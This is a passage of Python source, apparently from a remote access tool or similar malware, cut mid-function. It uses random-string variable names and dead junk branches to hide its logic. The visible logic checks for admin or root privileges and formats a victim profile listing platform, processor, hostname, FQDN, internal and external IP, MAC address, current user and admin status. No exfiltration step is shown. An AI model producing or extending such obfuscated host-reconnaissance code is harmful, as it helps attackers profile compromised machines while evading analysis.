                        else:
                            jzRtRnMXEVLDfvxVFhHhadWVaqRmVGTD = pNUpFgFvNsljRWBYImJDEVAbgHiuyztt
        else:
            jzRtRnMXEVLDfvxVFhHhadWVaqRmVGTD = okqIqYbJekobzdSWPnNyVSwgStFeGkDC
        ShQqtVBAettOOBhUlOloHejpuytLDoBJ = ctypes.windll.shell32.IsUserAnAdmin() != 0

        xUFFXdVGUsvErOqNvRbRfLWagKYguKYL = 'UWTvQptYbvaodNSjuuoaRcEKftFyBLTM'
        UTEbpwwLsXdTebqgkQXYODUdzdlPRIbC = 'dqFRfSjOwQKnqttJnfcoMRJLsxLmjWaQ'
        ExoctTewvZBkaoWKyLGOIeJQmmXgMudF = 'CAeZHdGEfCBqQwtMlJvqPHCNVPDSxkSF'
        dKmzhpTZPjTiUjFVjBwCUSINntAauBFM = 'qexYZKoEpxKxAVjgAWTotizGRwkwqNOr'
        yTwuZYieQswZMgmkGxSzeODFiBiHnFGb = 'YpgrfCkKBXjsSjGFNOwhvyFJwfyAEgDC'
        QyXzlvAxnjHHKuzpWPrJPMBOEKsFUuIG = 'ZxizdcdRQOzRMqOPRqLOltEwrNKEllYn'
        if xUFFXdVGUsvErOqNvRbRfLWagKYguKYL != dKmzhpTZPjTiUjFVjBwCUSINntAauBFM:
            UTEbpwwLsXdTebqgkQXYODUdzdlPRIbC = ExoctTewvZBkaoWKyLGOIeJQmmXgMudF
            for QyXzlvAxnjHHKuzpWPrJPMBOEKsFUuIG in dKmzhpTZPjTiUjFVjBwCUSINntAauBFM:
                if QyXzlvAxnjHHKuzpWPrJPMBOEKsFUuIG != ExoctTewvZBkaoWKyLGOIeJQmmXgMudF:
                    UTEbpwwLsXdTebqgkQXYODUdzdlPRIbC = UTEbpwwLsXdTebqgkQXYODUdzdlPRIbC
                else:
                    yTwuZYieQswZMgmkGxSzeODFiBiHnFGb = xUFFXdVGUsvErOqNvRbRfLWagKYguKYL
        else:
            ExoctTewvZBkaoWKyLGOIeJQmmXgMudF = xUFFXdVGUsvErOqNvRbRfLWagKYguKYL
            xUFFXdVGUsvErOqNvRbRfLWagKYguKYL = yTwuZYieQswZMgmkGxSzeODFiBiHnFGb
            if ExoctTewvZBkaoWKyLGOIeJQmmXgMudF == xUFFXdVGUsvErOqNvRbRfLWagKYguKYL:
                for QyXzlvAxnjHHKuzpWPrJPMBOEKsFUuIG in xUFFXdVGUsvErOqNvRbRfLWagKYguKYL:
                    if QyXzlvAxnjHHKuzpWPrJPMBOEKsFUuIG == ExoctTewvZBkaoWKyLGOIeJQmmXgMudF:
                        ExoctTewvZBkaoWKyLGOIeJQmmXgMudF = xUFFXdVGUsvErOqNvRbRfLWagKYguKYL
                    else:
                        ExoctTewvZBkaoWKyLGOIeJQmmXgMudF = yTwuZYieQswZMgmkGxSzeODFiBiHnFGb
    elif plat_type.startswith('linux') or platform.startswith('darwin'):

        YesBkEdMMxhDKlweynwAqZZiaveofxtf = 'RzVuDgurMfuzBMNYMlBZVJhbAhEjRuat'
        gYcPZROLSeBWeTwayYyOfIsgatPwNXML = 'gNAaiMwhrIozTdpKXYpjmTBsWWWUXFbh'
        if YesBkEdMMxhDKlweynwAqZZiaveofxtf != gYcPZROLSeBWeTwayYyOfIsgatPwNXML:
            YesBkEdMMxhDKlweynwAqZZiaveofxtf = 'gNAaiMwhrIozTdpKXYpjmTBsWWWUXFbh'
            gYcPZROLSeBWeTwayYyOfIsgatPwNXML = YesBkEdMMxhDKlweynwAqZZiaveofxtf
            YesBkEdMMxhDKlweynwAqZZiaveofxtf = 'RzVuDgurMfuzBMNYMlBZVJhbAhEjRuat'
        ShQqtVBAettOOBhUlOloHejpuytLDoBJ = os.getuid() == 0

        AGsFecMECrhPHIurPGcLyiZBKnmbBgTO = 'UfwwbTuLZMgccpOaQbLtxINmzfghJqkk'
        BJeScrWEJnZAAPDoiwDGZgiphevEJhsf = 'MeNxSsqfMohivkPaGxaClnYYNVZSscZX'
        TTplKZAeGMpPiIakVPMpAdSPxbaCBKRx = 'JtAjclOpzzMHPttwKcxZAZfMbNsDwCIu'
        QlxzVbnXxnuuwTPoXBhFYWQvFmFsZVyW = 'XwySwRpgbLeNwdGXgFFnurfONdnPClAh'
        iIsGbkrRhrGNuUIrebkUmuPXKutLBAGP = 'dwUvzBqXCAgRXGMzRRaZnxpkBkeZTxSq'
        oAvjLVKeEpmjCppPfxJFfANYCUfAkuaF = 'mbnbhJyHTZDtetuOddDtjlXJcQYMtluA'
        if TTplKZAeGMpPiIakVPMpAdSPxbaCBKRx == QlxzVbnXxnuuwTPoXBhFYWQvFmFsZVyW:
            for oAvjLVKeEpmjCppPfxJFfANYCUfAkuaF in iIsGbkrRhrGNuUIrebkUmuPXKutLBAGP:
                if oAvjLVKeEpmjCppPfxJFfANYCUfAkuaF == QlxzVbnXxnuuwTPoXBhFYWQvFmFsZVyW:
                    iIsGbkrRhrGNuUIrebkUmuPXKutLBAGP = AGsFecMECrhPHIurPGcLyiZBKnmbBgTO
                else:
                    QlxzVbnXxnuuwTPoXBhFYWQvFmFsZVyW = BJeScrWEJnZAAPDoiwDGZgiphevEJhsf
    vifxiVvycSIHXpntAxKCRWgoFSGHpioh = 'Yes' if ShQqtVBAettOOBhUlOloHejpuytLDoBJ else 'No'

    RJTfLHchVLQNLOdKlHmHcpFxgkRwrXBs = 'fILFfcLhAxxIPsfslAGcYFzvLRULIuix'
    JogwEHtWcuSaSoNyeglyRUATQVHScNIK = 'IcvEDmYhbWTejugmUiItKvUZrYrwfgjK'
    if RJTfLHchVLQNLOdKlHmHcpFxgkRwrXBs != JogwEHtWcuSaSoNyeglyRUATQVHScNIK:
        RJTfLHchVLQNLOdKlHmHcpFxgkRwrXBs = 'IcvEDmYhbWTejugmUiItKvUZrYrwfgjK'
        JogwEHtWcuSaSoNyeglyRUATQVHScNIK = RJTfLHchVLQNLOdKlHmHcpFxgkRwrXBs
        RJTfLHchVLQNLOdKlHmHcpFxgkRwrXBs = 'fILFfcLhAxxIPsfslAGcYFzvLRULIuix'
    CWzKhNitRROddQqzThWAbPnWqhpyhmrC = '''
    System Platform     - {}
    Processor           - {}
    Architecture        - {}
    Hostname            - {}
    FQDN                - {}
    Internal IP         - {}
    External IP         - {}
    MAC Address         - {}
    Current User        - {}
    Admin Access        - {}
    '''.format(loCUJpHFjgpbaXvOXybmAFmpYHefHalj, processor, architecture,
    aldWdknYUmPtYxzGFLMPIfgMCpOcKmIT, UeurXdWXiqUdXysVCXgObSoVUrtAvPKi, oYgFadnHAzfXwdIoXQDdXPLXxpdFvvbI, wxszCGeHAghkjrGHEilkReDOwtmBtfZB, gWEMKayPqmsanaYDuZfDCHRurbVMYIFl, rLNbmAMlddLSemRvSyhCUujqAGRnklTf, vifxiVvycSIHXpntAxKCRWgoFSGHpioh)
    return CWzKhNitRROddQqzThWAbPnWqhpyhmrC
